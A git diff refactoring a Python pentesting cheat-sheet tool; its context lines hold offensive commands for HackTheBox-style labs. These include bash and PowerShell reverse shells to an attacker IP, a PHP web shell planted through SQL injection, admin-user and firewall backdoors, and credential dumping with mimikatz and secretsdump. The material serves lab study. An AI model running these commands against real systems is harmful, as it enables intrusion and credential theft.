@@ -1,44 +1,34 @@
 import os
-from time import sleep
+from .cheat import Cheat
+from .color import Color
 
 
-class Cheat:
-    def __init__(self, name):
-        self.name = name
-        self.category = None
-        self.subCategory = None
-        self.output = None
-        self.addToList()
 
-    def addToList(self):
-        global cheatList
-        cheatList.append(self)
+# Global functions
+def get_ip():
+	ip = os.popen("""/bin/ip add | grep "tun0" | grep "inet" | tr "/" " " | awk '{print$2}'""").read().strip()
+	if ip in "":
+		ip = "x.x.x.x"
+	return ip
 
-
-class Color:
-    RESET = "\033[0m"
-    BOLD = "\033[1m"
-    GRAY = "\033[90m"
-    FAIL = "\033[91m"
-    OK_GREEN = "\033[92m"
-    WARNING = "\033[93m"
-    OK_BLUE = "\033[94m"
-    HEADER = "\033[95m"
-    OK_CYAN = "\033[96m"
+def create_new_cheat(name):
+	cheat = Cheat(name)
+	cheat_list.append(cheat)
+	return cheat
 
 
-ip = os.popen("""/bin/ip add | grep "tun0" | grep "inet" | tr "/" " " | awk '{print$2}'""").read().strip()
+# Global variable_name
+ip = get_ip()
+cheat_list = []
 
-if ip in "":
-	ip = "x.x.x.x"
-cheatList = []
+
 
 ######################################
 ######################################
 
-PSCredential = Cheat("PSCredential (runas)")
+PSCredential = create_new_cheat("PSCredential (runas)")
 PSCredential.category = "Windows"
-PSCredential.subCategory = "Powershell"
+PSCredential.sub_category = "Powershell"
 PSCredential.output = """[*] PSCredential - Create a Credential Object for PowerShell (runas):
 
 # Create Secure password and execute a command with other user
@@ -59,7 +49,7 @@ icmp_reverse_shell_windows = Cheat(
     "ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)"
 )
 icmp_reverse_shell_windows.category = "Windows"
-icmp_reverse_shell_windows.subCategory = "Reverse Shell"
+icmp_reverse_shell_windows.sub_category = "Reverse Shell"
 icmp_reverse_shell_windows.output = """[*] Reverse Shell when TCP and UDP connection are blocked by Firewall rules.
 
 # 1 - Download Nishang
@@ -100,9 +90,9 @@ powershell C:\Temp\pwned.ps1
 ######################################
 ######################################
 
-check_priv_file = Cheat("cacls.exe - Check Privilege of a file")
+check_priv_file = create_new_cheat("cacls.exe - Check Privilege of a file")
 check_priv_file.category = "Windows"
-check_priv_file.subCategory = "Utility"
+check_priv_file.sub_category = "Utility"
 check_priv_file.output = """[*] Check Privilege of a file like ls -lArth in Linux.
 cacls C:\PATH\File.ext
 """
@@ -114,7 +104,7 @@ alternative_data_streams = Cheat(
     "Alternate Data Streams (MetaData), hide file in a file"
 )
 alternative_data_streams.category = "Windows"
-alternative_data_streams.subCategory = "Utility"
+alternative_data_streams.sub_category = "Utility"
 alternative_data_streams.output = """[*] Check for hide data in a file (like stenography for images)
 
 # List all available data streams
@@ -138,7 +128,7 @@ firewall_rules_change_to_accept_IP_Attacker = Cheat(
     "Create new local user with administrator privilege - Firewall Rules - PostExploit"
 )
 firewall_rules_change_to_accept_IP_Attacker.category = "Windows"
-firewall_rules_change_to_accept_IP_Attacker.subCategory = "PostExploit"
+firewall_rules_change_to_accept_IP_Attacker.sub_category = "PostExploit"
 firewall_rules_change_to_accept_IP_Attacker.output = """[*] Create new local user with administrator privilege...
 
 # Add a new user and assign him as Administrators group for highest local privilege
@@ -165,9 +155,9 @@ net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL
 ######################################
 ######################################
 
-evil_winrm = Cheat("Evil-winrm - (Web Service Management Protocol WS-Management) ")
+evil_winrm = create_new_cheat("Evil-winrm - (Web Service Management Protocol WS-Management) ")
 evil_winrm.category = "Windows"
-evil_winrm.subCategory = "WinRM"
+evil_winrm.sub_category = "WinRM"
 evil_winrm.output = """[*] Evil-winrm - Automated tool to bind stable shell when WS-Management Protocol is active an open and we have correct credentials
 
 gem install evil-winrm
@@ -177,9 +167,9 @@ evil-winrm -i 10.10.10.57 -u 'administrator' -p '1234test'
 ######################################
 ######################################
 
-snmpwalk = Cheat("snmpwalk - onesixtyone - 161 UDP - Comunity string - SNMP")
+snmpwalk = create_new_cheat("snmpwalk - onesixtyone - 161 UDP - Comunity string - SNMP")
 snmpwalk.category = "Tools"
-snmpwalk.subCategory = "SNMP"
+snmpwalk.sub_category = "SNMP"
 snmpwalk.output = """[*] Even if port 161 is filtered or pointed to closed, this tool can find out if port 161 UDP is operational.
 
 onesixtyone 10.10.10.116
@@ -202,9 +192,9 @@ snmp-check [OPTIONS] <target IP address>
 ######################################
 ######################################
 
-ike_scan = Cheat("ike-scan - 500 UDP - IPsec VPN / ipsec - strongSwan (VPN)")
+ike_scan = create_new_cheat("ike-scan - 500 UDP - IPsec VPN / ipsec - strongSwan (VPN)")
 ike_scan.category = "Tools"
-ike_scan.subCategory = "VPN"
+ike_scan.sub_category = "VPN"
 ike_scan.output = """[*] ike-scan - Discover and fingerprint IKE hosts (IPsec VPN servers)
 
 # ver vídeo - HackTheBox | Conceal [OSCP Style] (TWITCH LIVE)
@@ -223,7 +213,7 @@ file_transfere_windows_iwr = Cheat(
     "File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe"
 )
 file_transfere_windows_iwr.category = "Windows"
-file_transfere_windows_iwr.subCategory = "File Transfere"
+file_transfere_windows_iwr.sub_category = "File Transfere"
 file_transfere_windows_iwr.output = """[*] Simple File Transfere for Windows with PowerShell
 
 # simple download
@@ -247,7 +237,7 @@ file_transfere_windows_smbserver = Cheat(
     "File Transfere Windows - SmbServer.py (Impacket)"
 )
 file_transfere_windows_smbserver.category = "Windows"
-file_transfere_windows_smbserver.subCategory = "File Transfere"
+file_transfere_windows_smbserver.sub_category = "File Transfere"
 file_transfere_windows_smbserver.output = """[*] Create Shared Folder by the Internet with SmbServer.py (Impacket)
 
 # On kali
@@ -264,9 +254,9 @@ copy \\\\10.10.14.53\smbFolder\\nc64.exe C:\Windows\Temp\\nc64.exe
 ######################################
 ######################################
 
-oracle_odat = Cheat("odat - Oracle DatabaseAttacking Tools - 1521 TCP oracle-tns")
+oracle_odat = create_new_cheat("odat - Oracle DatabaseAttacking Tools - 1521 TCP oracle-tns")
 oracle_odat.category = "Tools"
-oracle_odat.subCategory = "Databases"
+oracle_odat.sub_category = "Databases"
 
 oracle_odat.output = """[*] Powerfull tool to exploit Oracle Database
 
@@ -288,9 +278,9 @@ odat externaltable -s 10.10.10.82 -d <ValidSID> -U "ValidUser" -P "ValidPass" --
 ######################################
 ######################################
 
-crackMapExec = Cheat("crackmapexec - Impacket - 445 TCP")
+crackMapExec = create_new_cheat("crackmapexec - Impacket - 445 TCP")
 crackMapExec.category = "Windows"
-crackMapExec.subCategory = "Impacket"
+crackMapExec.sub_category = "Impacket"
 crackMapExec.output = """[*] crackmapexec is a swiss army knife for pentesting network! 
 [*] available protocols: ssh, winrm, mssql, ldap, smb
 
@@ -316,7 +306,7 @@ cewl = Cheat(
     "cewl - Create a list of password (or something) from all words of a html page"
 )
 cewl.category = "Tools"
-cewl.subCategory = "Password"
+cewl.sub_category = "Password"
 cewl.output = """[*] Simple tool to take all word of a html page and create a file
 
 cewl -w passwords.txt http://10.10.10.100/
@@ -326,9 +316,9 @@ cewl -w passwords.txt http://10.10.10.100/ --with-numbers
 ######################################
 ######################################
 
-smbpasswd = Cheat("smbpasswd - SMB STATUS_PASSWORD_MUST_CHANGE - Impacket - 445 TCP")
+smbpasswd = create_new_cheat("smbpasswd - SMB STATUS_PASSWORD_MUST_CHANGE - Impacket - 445 TCP")
 smbpasswd.category = "Windows"
-smbpasswd.subCategory = "Impacket"
+smbpasswd.sub_category = "Impacket"
 smbpasswd.output = """[*] smbpasswd - change a user's SMB password
 
 smbpasswd -r 10.10.10.193 -U "bhult"
@@ -338,9 +328,9 @@ smbpasswd -r 10.10.10.193 -U "bhult"
 ######################################
 ######################################
 
-seLoadDriverPrivilege = Cheat("SeLoadDriverPrivilege /priv")
+seLoadDriverPrivilege = create_new_cheat("SeLoadDriverPrivilege /priv")
 seLoadDriverPrivilege.category = "Windows"
-seLoadDriverPrivilege.subCategory = "PrivEsc via group"
+seLoadDriverPrivilege.sub_category = "PrivEsc via group"
 
 seLoadDriverPrivilege.output = """[*] SeLoadDriverPrivilege - If Enabled... GG! 
 [*] https://github.com/limitedeternity/ExploitCapcom
@@ -349,9 +339,9 @@ seLoadDriverPrivilege.output = """[*] SeLoadDriverPrivilege - If Enabled... GG!
 ######################################
 ######################################
 
-reverseSheel = Cheat("Basic and advanced Reverses Shells - Linux")
+reverseSheel = create_new_cheat("Basic and advanced Reverses Shells - Linux")
 reverseSheel.category = "Linux"
-reverseSheel.subCategory = "Reverse Shell"
+reverseSheel.sub_category = "Reverse Shell"
 reverseSheel.output = """[*] TCP Reverse Shell - Linux
 
 bash -c 'exec sh -i &>/dev/tcp/10.10.14.53/443 <&1'
@@ -372,9 +362,9 @@ bash -c 'exec sh -i &>/dev/udp/10.10.14.53/443 <&1'
 ######################################
 ######################################
 
-reverseShell_Win = Cheat("Basic and advanced Reverse Shells - Windows")
+reverseShell_Win = create_new_cheat("Basic and advanced Reverse Shells - Windows")
 reverseShell_Win.category = "Windows"
-reverseShell_Win.subCategory = "Reverse Shell"
+reverseShell_Win.sub_category = "Reverse Shell"
 reverseShell_Win.output = """[*] Simple one liner to get a reverse Shell TCP Windows
 
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.53',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
@@ -383,9 +373,9 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 ######################################
 ######################################
 
-python_urlEncode = Cheat("UrlEncode - urllib - BeautifulSoup - Python3")
+python_urlEncode = create_new_cheat("UrlEncode - urllib - BeautifulSoup - Python3")
 python_urlEncode.category = "Python"
-python_urlEncode.subCategory = "Encoding"
+python_urlEncode.sub_category = "Encoding"
 python_urlEncode.output = """[*] Convert strings into urlencoded strings for requests
 
 # Don't forgot the " simbole can't be inputed when write cmd.
@@ -412,9 +402,9 @@ from bs4 import BeautifulSoup
 ######################################
 ######################################
 
-lxd_id = Cheat("Group LXD / Docker")
+lxd_id = create_new_cheat("Group LXD / Docker")
 lxd_id.category = "Linux"
-lxd_id.subCategory = "PrivEsc via group"
+lxd_id.sub_category = "PrivEsc via group"
 lxd_id.output = """[*] PrivEsc with LXD / Docker Group...
 
 # Git clone lxd alpine builder from saghul...
@@ -442,9 +432,9 @@ lxc exec javali-container /bin/sh
 ######################################
 ######################################
 
-smbclient = Cheat("smbclient - Basics - TCP 445 - cifs-utils (smb mount)")
+smbclient = create_new_cheat("smbclient - Basics - TCP 445 - cifs-utils (smb mount)")
 smbclient.category = "Windows"
-smbclient.subCategory = "File Transfere"
+smbclient.sub_category = "File Transfere"
 smbclient.output = """[*] smbclient - ftp-like client to access SMB/CIFS resources on servers
 
 smbclient -L \\\\\\\\10.10.10.10\\\\                       # Enumera as pastas não ocultas em modo anonymous
@@ -465,9 +455,9 @@ mount -t cifs //10.10.10.59/ACCT /mnt/smb -o username=Finance,password=Acc0untin
 ######################################
 ######################################
 
-manualTcpScanInBash = Cheat("Manual TCP Scan in Bash")
+manualTcpScanInBash = create_new_cheat("Manual TCP Scan in Bash")
 manualTcpScanInBash.category = "Tools"
-manualTcpScanInBash.subCategory = "Bash"
+manualTcpScanInBash.sub_category = "Bash"
 manualTcpScanInBash.output = """[*] Manually scan ports in bash when no nmap or similar
 
 for port in $(seq 1 65355); do
@@ -478,9 +468,9 @@ done; wait
 ######################################
 ######################################
 
-hydraBasics = Cheat("hydra - Login BruteForce")
+hydraBasics = create_new_cheat("hydra - Login BruteForce")
 hydraBasics.category = "Tools"
-hydraBasics.subCategory = "BruteForce"
+hydraBasics.sub_category = "BruteForce"
 hydraBasics.output = """[*] A very fast network logon cracker which supports many different services
 
 # PRINCIPAL OPTIONS:
@@ -520,9 +510,9 @@ hydra -l $user -P ./passwordlist.txt $ip http-get /dir/
 ######################################
 ######################################
 
-wgetRecursive = Cheat("wget Recursive")
+wgetRecursive = create_new_cheat("wget Recursive")
 wgetRecursive.category = "Tools"
-wgetRecursive.subCategory = "File Transfere"
+wgetRecursive.sub_category = "File Transfere"
 wgetRecursive.output = """[*] Download recursively all file from simple server via url
 
 # -np (no-parent) -R "string" (remove files with string name... wilcards works)
@@ -532,9 +522,9 @@ wget -r http://10.10.10.75/nibbleblog/content/ -np -R "index.html*"
 ######################################
 ######################################
 
-wpscan = Cheat("wpscan - wordpress")
+wpscan = create_new_cheat("wpscan - wordpress")
 wpscan.category = "Tools"
-wpscan.subCategory = "Web"
+wpscan.sub_category = "Web"
 wpscan.output = """[*] WPScan - WordPress Security Scanner
 
 wpscan --url www.website.com              # Non-intrusive scan
@@ -567,9 +557,9 @@ wpscan --url www.website.com --passwords /path/wordlist.txt --usernames admin --
 ######################################
 ######################################
 
-mimeChanger = Cheat("Change MIME Type of file")
+mimeChanger = create_new_cheat("Change MIME Type of file")
 mimeChanger.category = "Tools"
-mimeChanger.subCategory = "Utility"
+mimeChanger.sub_category = "Utility"
 mimeChanger.output = """[*] Change MIME Type of file...
 
 # https://en.wikipedia.org/wiki/List_of_file_signatures
@@ -581,9 +571,9 @@ xxd -r -p -o 0 <(echo FF D8 FF DB) shell.php.jpg
 ######################################
 ######################################
 
-crontabs = Cheat("Crontabs - Basic enumeration Linux")
+crontabs = create_new_cheat("Crontabs - Basic enumeration Linux")
 crontabs.category = "Linux"
-crontabs.subCategory = "Enumeration"
+crontabs.sub_category = "Enumeration"
 crontabs.output = """[*] Crontabs - Basic enumeration Linux
 
 /dev/shm  # comparável ao c:\windows\temp
@@ -603,9 +593,9 @@ cat /var/spool/cron/crontabs/root
 ######################################
 ######################################
 
-cron_checker = Cheat("croncheck.sh - Check Diferentes Processes running")
+cron_checker = create_new_cheat("croncheck.sh - Check Diferentes Processes running")
 cron_checker.category = "Linux"
-cron_checker.subCategory = "Enumeration"
+cron_checker.sub_category = "Enumeration"
 cron_checker.output = """[*] CronCheck.sh - Simple Bash Script to check diferentes processes running on Linux
 
 #!/bin/bash
@@ -628,7 +618,7 @@ find_and_grep = Cheat(
     "Find - Grep for Basic enumeration Linux (Clear Usernames or passes, SUID)"
 )
 find_and_grep.category = "Linux"
-find_and_grep.subCategory = "Utility"
+find_and_grep.sub_category = "Utility"
 find_and_grep.output = """[*] Find - Grep for Basic enumeration Linux
 
 # Usernames or Passwords in clear text?! (examples)
@@ -674,9 +664,9 @@ find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
 ######################################
 ######################################
 
-network = Cheat("network - Basic enumeration Linux")
+network = create_new_cheat("network - Basic enumeration Linux")
 network.category = "Linux"
-network.subCategory = "Enumeration"
+network.sub_category = "Enumeration"
 network.output = """[*] Basic Network enumeration on Linux
 
 cat /proc/net/tcp
@@ -720,7 +710,7 @@ capabilities = Cheat(
     "Capabilities - setcap / getcap / setuid - Basic enumeration Linux"
 )
 capabilities.category = "Linux"
-capabilities.subCategory = "Enumeration"
+capabilities.sub_category = "Enumeration"
 capabilities.output = """[*] Capabilities - setcap / getcap / setuid
 
 getcap -r / 2>/dev/null               # python with that can easily convert user to root.
@@ -736,7 +726,7 @@ findSubDomain_dns = Cheat(
     "nslookup / dig / dnsenum / virtual hosts - Get SubDomain - DNS"
 )
 findSubDomain_dns.category = "Tools"
-findSubDomain_dns.subCategory = "DNS"
+findSubDomain_dns.sub_category = "DNS"
 findSubDomain_dns.output = """[*] Some tools to find sub domains...
 
 nslookup
@@ -754,9 +744,9 @@ wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.tx
 ######################################
 ######################################
 
-mysqlBasicAndSqlInjection = Cheat("MySQL / SqlInjection")
+mysqlBasicAndSqlInjection = create_new_cheat("MySQL / SqlInjection")
 mysqlBasicAndSqlInjection.category = "Tools"
-mysqlBasicAndSqlInjection.subCategory = "Databases"
+mysqlBasicAndSqlInjection.sub_category = "Databases"
 mysqlBasicAndSqlInjection.output = """[*] Command                                                      # Description
 
 [*] General
@@ -862,9 +852,9 @@ cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/
 ######################################
 ######################################
 
-fileTransfereLinux = Cheat("File Transfere Linux - nc / ftp / lftp / scp")
+fileTransfereLinux = create_new_cheat("File Transfere Linux - nc / ftp / lftp / scp")
 fileTransfereLinux.category = "Linux"
-fileTransfereLinux.subCategory = "File Transfere"
+fileTransfereLinux.sub_category = "File Transfere"
 fileTransfereLinux.output = """[*] File Transfere Techniques With nc - Linux
 
 nc -nlvp 4646 > file.f     # receiver
@@ -901,9 +891,9 @@ scp username@x.x.x.x:/remote/directory/fileName /local/directory/fileName
 ######################################
 ######################################
 
-webShell = Cheat("WebShell - php")
+webShell = create_new_cheat("WebShell - php")
 webShell.category = "Web"
-webShell.subCategory = "RCE"
+webShell.sub_category = "RCE"
 webShell.output = f"""[*] Web Shell em PHP
 
 <?php
@@ -925,7 +915,7 @@ fakeShell = Cheat(
     "Fake Shell in bash for web shell with parameter and RCE - urlencoded"
 )
 fakeShell.category = "Web"
-fakeShell.subCategory = "RCE"
+fakeShell.sub_category = "RCE"
 fakeShell.output = """[*] Script in bash to simule shell via webshell RCE
 
 #!/bin/bash
@@ -956,7 +946,7 @@ treeWorpress = Cheat(
     "Wordpress - WP - Tree/structure of basic wordpress path and files"
 )
 treeWorpress.category = "Web"
-treeWorpress.subCategory = "CMS"
+treeWorpress.sub_category = "CMS"
 treeWorpress.output = """[*] Wordpress basic structure path and files
 
 sudo wget http://wordpress.org/latest.tar.gz
@@ -1327,9 +1317,9 @@ tree -L 3 --dirsfirst . -f -x
 ######################################
 ######################################
 
-reverseShellWordpress = Cheat("RCE - Wordpress (WP)")
+reverseShellWordpress = create_new_cheat("RCE - Wordpress (WP)")
 reverseShellWordpress.category = "Web"
-reverseShellWordpress.subCategory = "RCE"
+reverseShellWordpress.sub_category = "RCE"
 reverseShellWordpress.output = """[*] When authenticated, we can change the WordPress 404.php to get RCE
 
 # edit 404.php
@@ -1345,9 +1335,9 @@ http://10.10.10.37/?p=404.php # Or http://10.10.10.37/?p=404.php&cmd=whoami if i
 ######################################
 ######################################
 
-ffuf = Cheat("ffuf - Fuzz Faster U Fool")
+ffuf = create_new_cheat("ffuf - Fuzz Faster U Fool")
 ffuf.category = "Tools"
-ffuf.subCategory = "BruteForce"
+ffuf.sub_category = "BruteForce"
 ffuf.output = """[*] Virtual Host Discovery (without DNS records)
 
 # Start by figurinf out the response length of false positive
@@ -1370,9 +1360,9 @@ ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u h
 ######################################
 ######################################
 
-chisel_portforwarding = Cheat("chisel - port forwarding - TCP/UDP tunnel")
+chisel_portforwarding = create_new_cheat("chisel - port forwarding - TCP/UDP tunnel")
 chisel_portforwarding.category = "Tools"
-chisel_portforwarding.subCategory = "Forwarding"
+chisel_portforwarding.sub_category = "Forwarding"
 chisel_portforwarding.output = """[*] Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH, for port forwarding.
 
 # https://github.com/jpillora/chisel/releases
@@ -1390,9 +1380,9 @@ sudo chisel server -p 8008 --reverse   # port 8008 is the port of the chisel ser
 ######################################
 ######################################
 
-jwt_openssl = Cheat("JWT - openssl | get certificate via openssl | self-signed certificate")
+jwt_openssl = create_new_cheat("JWT - openssl | get certificate via openssl | self-signed certificate")
 jwt_openssl.category = "Web"
-jwt_openssl.subCategory = "Cookie"
+jwt_openssl.sub_category = "Cookie"
 jwt_openssl.output = """[*] Generate privKey to manipulate JWT token
 
 openssl genrsa -out privKey.key 2048
@@ -1417,9 +1407,9 @@ openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
 ######################################
 ######################################
 
-juicyPotato = Cheat("JuicyPotato.exe - Windows - PrivEsc - SeImpersonatePrivilege")
+juicyPotato = create_new_cheat("JuicyPotato.exe - Windows - PrivEsc - SeImpersonatePrivilege")
 juicyPotato.category = "Windows"
-juicyPotato.subCategory = "PrivEsc via group"
+juicyPotato.sub_category = "PrivEsc via group"
 juicyPotato.output = """[*] If in life you see SeImpersonatePrivilege, just use JuicyPotato!! =)
 
 # Download JuicyPotato.exe and set a server http
@@ -1459,9 +1449,9 @@ psexec.py WORKGROUP/j4vali:@10.10.10.93 cmd.exe
 ######################################
 ######################################
 
-keepass = Cheat("keepassxc - Password Manager KeePass Manager")
+keepass = create_new_cheat("keepassxc - Password Manager KeePass Manager")
 keepass.category = "Tools"
-keepass.subCategory = "Password"
+keepass.sub_category = "Password"
 keepass.output = """[*] Extract passwords of KeePass (GUI)
 
 sudo install keepassxc
@@ -1479,7 +1469,7 @@ sqsh = Cheat(
     "sqsh - sqsh - Interactive database shell (mysql for 1433/tcp  open  ms-sql-s) - mssqlclient.py"
 )
 sqsh.category = "Tools"
-sqsh.subCategory = "Databases"
+sqsh.sub_category = "Databases"
 sqsh.output = """[*] sqsh - Interactive database shell
 
 # Default Credentials are sa:sa OR sa without password (just press Enter)
@@ -1513,9 +1503,9 @@ reconfigure
 ######################################
 ######################################
 
-x_forwarded_for = Cheat("X-Forwarded-For - Proxy - Header - XFF")
+x_forwarded_for = create_new_cheat("X-Forwarded-For - Proxy - Header - XFF")
 x_forwarded_for.category = "Web"
-x_forwarded_for.subCategory = "XFF"
+x_forwarded_for.sub_category = "XFF"
 x_forwarded_for.output = """[*] The X-Forwarded-For (XFF) header is a de-facto standard header for identifying the originating IP address
 
 # You can simule easily your connection was from another IP with curl, modifying the header (or burp or something like that)
@@ -1525,9 +1515,9 @@ curl -s -X GET 'http://10.10.10.167/admin.php' -H 'X-Forwarded-For: 192.168.4.28
 ######################################
 ######################################
 
-checkenv = Cheat("Check Env if is 64 bits - Is64BitOperatingSystem - Is64BitProcess")
+checkenv = create_new_cheat("Check Env if is 64 bits - Is64BitOperatingSystem - Is64BitProcess")
 checkenv.category = "Windows"
-checkenv.subCategory = "Powershell"
+checkenv.sub_category = "Powershell"
 checkenv.output = """[*] Check Env on windows to make sure the environment is equal to the system
 
 [Environment]::Is64BitOperatingSystem
@@ -1537,9 +1527,9 @@ checkenv.output = """[*] Check Env on windows to make sure the environment is eq
 ######################################
 ######################################
 
-seclogon = Cheat("sc - Service Control Manager and services")
+seclogon = create_new_cheat("sc - Service Control Manager and services")
 seclogon.category = "Windows"
-seclogon.subCategory = "PrivEsc"
+seclogon.sub_category = "PrivEsc"
 seclogon.output = """[*] if you can modify any service registry, you can modify path to start another program instead
 
 cmd /c sc query seclogon  # If stopped, we can modify path to start another program instead
@@ -1551,9 +1541,9 @@ cmd /c sc start seclogon
 ######################################
 ######################################
 
-bloodhound = Cheat("bloodhound-python / SharpHound - AD domain | neo4j - Windows")
+bloodhound = create_new_cheat("bloodhound-python / SharpHound - AD domain | neo4j - Windows")
 bloodhound.category = "Windows"
-bloodhound.subCategory = "Enumeration"
+bloodhound.sub_category = "Enumeration"
 bloodhound.output = """[*] bloodhound-python - Enumerate All AD domain for bloodhound GUI in LOCAL
 
 # The output of this command should give files.json for bloodhound GUI aplication
@@ -1576,9 +1566,9 @@ wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors
 ######################################
 ######################################
 
-rpcclient = Cheat("rpcclient - MS-RPC - MSRPC - Windows")
+rpcclient = create_new_cheat("rpcclient - MS-RPC - MSRPC - Windows")
 rpcclient.category = "Windows"
-rpcclient.subCategory = "RPC"
+rpcclient.sub_category = "RPC"
 rpcclient.output = f"""[*] rpcclient - tool for executing client side MS-RPC functions
 
 # rpcclient [-A authfile] [-c <command string>] [-d debuglevel] [-l logdir] [-N] [-s <smb config file>] [-U username[%password]] [-W workgroup] [-I destinationIP] {{BINDING-STRING|HOST}}
@@ -1605,9 +1595,9 @@ rpcclient -U "support%!00^BlackKnight" 10.10.10.192
 ######################################
 ######################################
 
-lsass = Cheat("pypykatz - lsass.DMP - Memory Dump")
+lsass = create_new_cheat("pypykatz - lsass.DMP - Memory Dump")
 lsass.category = "Windows"
-lsass.subCategory = "RPC"
+lsass.sub_category = "RPC"
 lsass.output = """[*] Pure Python implementation of Mimikatz - (lsa) Get secrets from memory dump
 
 pypykatz lsa minidump lsass.DMP
@@ -1616,9 +1606,9 @@ pypykatz lsa minidump lsass.DMP
 ######################################
 ######################################
 
-samAndSystem = Cheat("SAM and SYSTEM - Dump hash and system information")
+samAndSystem = create_new_cheat("SAM and SYSTEM - Dump hash and system information")
 samAndSystem.category = "Windows"
-samAndSystem.subCategory = "PrivEsc"
+samAndSystem.sub_category = "PrivEsc"
 samAndSystem.output = """[*] SAM and SYSTEM - Dump hash and system information
 
 # Get a copy files in use in RAM memory
@@ -1636,9 +1626,9 @@ secretsdump.py -sam sam.backup -system system.backup LOCAL
 ######################################
 ######################################
 
-rdate = Cheat("rdate - Clock skew too great - syncronize time")
+rdate = create_new_cheat("rdate - Clock skew too great - syncronize time")
 rdate.category = "Tools"
-rdate.subCategory = "Utility"
+rdate.sub_category = "Utility"
 rdate.output = """[*] rdate - set the system's date from a remote hos
 
 rdate -n 10.10.10.175
@@ -1647,9 +1637,9 @@ rdate -n 10.10.10.175
 ######################################
 ######################################
 
-mimikatz = Cheat("mimikatz.exe - GetChanges && GetChangesAll in AD/DC")
+mimikatz = create_new_cheat("mimikatz.exe - GetChanges && GetChangesAll in AD/DC")
 mimikatz.category = "Windows"
-mimikatz.subCategory = "PrivEsc via group"
+mimikatz.sub_category = "PrivEsc via group"
 mimikatz.output = """[*] Dump Hash of all users of a AD or a DC, when we have GetChanges && GetChangesAll up
 
 wget https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe
@@ -1664,9 +1654,9 @@ secretsdump.py egotistical-bank.local/fsmith@10.10.10.175
 ######################################
 ######################################
 
-goBuild = Cheat("go build flags - upx - minimize executable files")
+goBuild = create_new_cheat("go build flags - upx - minimize executable files")
 goBuild.category = "Tools"
-goBuild.subCategory = "Utility"
+goBuild.sub_category = "Utility"
 goBuild.output = """[*] Build an executable in go with flags to get a small binary
 
 go build -ldflags '-s -w' .
@@ -1680,7 +1670,7 @@ kerbrute = Cheat(
     "kerbrute / GetNPUsers.py - Enumerate Users from DC/AD Windows through Kerberos Pre-Authentication (AS-REP Roasting)"
 )
 kerbrute.category = "Windows"
-kerbrute.subCategory = "Kerberos"
+kerbrute.sub_category = "Kerberos"
 kerbrute.output = """[*] KERBRUTE - A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication
 
 # Repository: https://github.com/ropnop/kerbrute
@@ -1699,9 +1689,9 @@ GetNPUsers.py egotistical-bank.local/ -no-pass -usersfile users.txt
 ######################################
 ######################################
 
-defaultCredentials = Cheat("Search for passwords in Windows/AD/DC")
+defaultCredentials = create_new_cheat("Search for passwords in Windows/AD/DC")
 defaultCredentials.category = "Windows"
-defaultCredentials.subCategory = "Password"
+defaultCredentials.sub_category = "Password"
 defaultCredentials.output = """[*] Search for “Password”
 
 #Search suspicious files from filename
@@ -1737,9 +1727,9 @@ reg query HKCU /f password /t REG_SZ /s #Look for registries in HKCU that contai
 ######################################
 ######################################
 
-ldapsearch = Cheat("ldapsearch - LDAP search tool")
+ldapsearch = create_new_cheat("ldapsearch - LDAP search tool")
 ldapsearch.category = "Windows"
-ldapsearch.subCategory = "RPC"
+ldapsearch.sub_category = "RPC"
 ldapsearch.output = """[*] ldapsearch is a shell-accessible interface to the ldap_search_ext(3) library cal
 
 # sudo apt install ldap-utils
@@ -1752,9 +1742,9 @@ ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local" -
 ######################################
 ######################################
 
-xxd = Cheat("xxd - Hexadecimal Editor - MIME")
+xxd = create_new_cheat("xxd - Hexadecimal Editor - MIME")
 xxd.category = "Tools"
-xxd.subCategory = "Utility"
+xxd.sub_category = "Utility"
 xxd.output = """[*] xxd - Hexadecimal Editor
 
 # encode as Hexadecimal
@@ -1773,9 +1763,9 @@ xxd -r -p -o 0 <(echo FF D8 FF DB) shell.php.jpg
 ######################################
 ######################################
 
-vncdecrypt = Cheat("VNC decrypt - oneliner")
+vncdecrypt = create_new_cheat("VNC decrypt - oneliner")
 vncdecrypt.category = "Tools"
-vncdecrypt.subCategory = "VNC"
+vncdecrypt.sub_category = "VNC"
 vncdecrypt.output = """[*] Decrypt passwords stored in VNC files
 
 echo -n d7a514d8c556aade | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
@@ -1784,9 +1774,9 @@ echo -n d7a514d8c556aade | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K 
 ######################################
 ######################################
 
-socat = Cheat("socat - PortForwarding - localhost to remote host ipv6")
+socat = create_new_cheat("socat - PortForwarding - localhost to remote host ipv6")
 socat.category = "Tools"
-socat.subCategory = "Forwarding"
+socat.sub_category = "Forwarding"
 socat.output = """[*] Socat - Multipurpose relay (SOcket CAT)
 [*] Socat  is  a command line based utility that establishes two bidirectional byte streams and transfers data between them
 
@@ -1796,9 +1786,9 @@ socat TCP-LISTEN:445,fork TCP:dead:beef::b885:d62a:d679:573f:445
 ######################################
 ######################################
 
-mp_cmd_exe = Cheat("MpCmdRun.exe - Force Scan AntiVirus for Responder.py - AV - NTML")
